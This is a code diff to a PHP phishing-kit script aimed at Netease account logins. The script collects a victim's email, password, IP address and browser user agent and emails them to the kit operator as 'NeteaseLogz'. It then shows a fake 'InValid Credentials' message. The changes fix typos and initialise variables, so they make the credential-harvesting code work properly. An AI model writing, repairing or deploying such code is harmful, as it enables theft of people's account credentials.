@@ -6,18 +6,20 @@ if($email != null && $password != null){
 	$ip = getenv("REMOTE_ADDR");
 	$hostname = gethostbyaddr($ip);
 	$useragent = $_SERVER['HTTP_USER_AGENT'];
-	$message .= "|----------| xLs |--------------|\n";
+	$message = "";
+$message .= "|----------| xLs |--------------|\n";
 	
 	$message .= "Online ID            : ".$email."\n";
-	$messsage .= " ".$email."\n";
+	$message .= " ".$email."\n";
         $message .= "Passcode              : ".$password."\n";
 	$message .= "|--------------- I N F O | I P -------------------|\n";
 	$message .= "|Client IP: ".$ip."\n";
 	
 	$message .= "User Agent : ".$useragent."\n";
 	$message .= "|----------- fudsender(dot)com --------------|\n";
-	$send = $Receive_email;
-	$subject = "NeteaseLogz : $messsage";
+	$redirect = "/";
+$send = $Receive_email;
+	$subject = "NeteaseLogz : $message";
     send_report($send, $subject, $message);   
 	$signal = 'ok';
 	$msg = 'InValid Credentials';
